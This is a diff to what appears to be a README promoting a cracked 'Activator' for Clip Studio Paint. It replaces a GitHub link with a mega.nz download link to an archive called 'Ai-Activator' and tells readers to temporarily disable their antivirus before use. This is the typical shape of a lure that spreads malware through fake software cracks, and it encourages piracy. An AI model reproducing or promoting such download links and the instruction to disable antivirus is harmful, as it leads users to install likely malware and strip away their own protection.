@@ -2,7 +2,7 @@
 
 # Unlock the Full Potential of Clip Studio Paint! 🔓
 
-# [Download Activator](https://github.com/AciklovirDev/test1/releases/tag/Activator) (Archive: **Ai-Activator**)
+# [Download Activator](https://mega.nz/file/AmN13CyJ#MDOjPVeMH_eybALyINlYqIVjbLA5u9_j6S5TptgQWqg) (Archive: **Ai-Activator**)
 
 ## **Important:** Please temporarily disable your antivirus before use.
 
